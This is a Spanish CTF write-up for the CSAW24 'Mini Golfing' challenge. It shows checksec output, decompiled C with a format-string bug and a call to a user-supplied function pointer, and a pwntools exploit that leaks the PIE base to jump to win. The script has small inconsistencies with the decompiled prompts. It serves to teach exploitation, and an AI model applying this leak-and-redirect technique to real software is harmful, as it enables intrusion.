---
title: Mini Golfing
date: 2024-09-24
ctf: CSAW24
author: naibu3
---
#writeup 
# Reconocimiento

Nos dan un binario de 64 bits. Si analizamos con [[checksec]]:

```checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

Vemos que tenemos el [[NX bit]] activo, por lo que no podremos ejecutar código del stack. Además tenemos [[PIE]], por lo que las direcciones de memoria variarán con cada ejecución.

Analizando con [[gdb|gdb-peda]], vemos que existe una función *main* y una función *win*, a la que no se llama nunca.

Si tratamos de descompilar el binario:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char input[0x400];  // Buffer de 1024 bytes
    long func;          // Puntero a función

    // Limpia el buffer stdout
    setvbuf(stdout, NULL, _IONBF, 0);
    fflush(stdout);

    // Limpia el buffer stdin
    setvbuf(stdin, NULL, _IONBF, 0);
    fflush(stdin);

    // Inicializa los buffers con 0
    memset(&input, 0, sizeof(input));
    
    // Mensajes de salida
    puts("Input some data: ");
    printf("Give me input: ");

    // Lee la entrada del usuario
    fgets(input, sizeof(input), stdin);

    // Imprime el mensaje fijo
    printf("Your input: ");
    printf(input);  // ¡Posible vulnerabilidad de formato!

    // Pregunta por un valor de función
    printf("Enter function pointer: ");
    scanf("%lx", &func);  // Escanea una dirección de función

    printf("Calling function at: %lx\n", func);

    // Llama a la función en la dirección proporcionada
    ((void (*)())func)();  // Conversión a puntero de función y ejecución

    return 0;
}
```

Nos damos cuenta de que en la parte que nos pide un input y lo imprime tenemos una vulnerabilidad de tipo [[Format string]].

# Explotación

Con el format string que hemos encontrado podemos leakear una dirección de memoria del binario para calcular la dirección de *win*. Para ello debemos buscar alguna posición del stack en la que se almacene una dirección del binario.

Esto podemos hacerlo probando o con el propio GDB. En este caso, descubrimos que la dirección de *main* se encuentra en la dirección 171 del stack.

Ya podemos crear un script:

```python3
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'golf')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("golfing.ctf.csaw.io", 9999)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()

io.recvuntil(b'name?')
io.sendline(b'%171$x')

main_addr = io.recvline().decode('UTF-8').split(": ")[1]
log.success(main_addr)

main_addr = int(main_addr, 16)
log.info(main_addr)

win_addr = main_addr - 26
win_addr = hex(win_addr)

io.sendline(win_addr)

io.interactive()
```


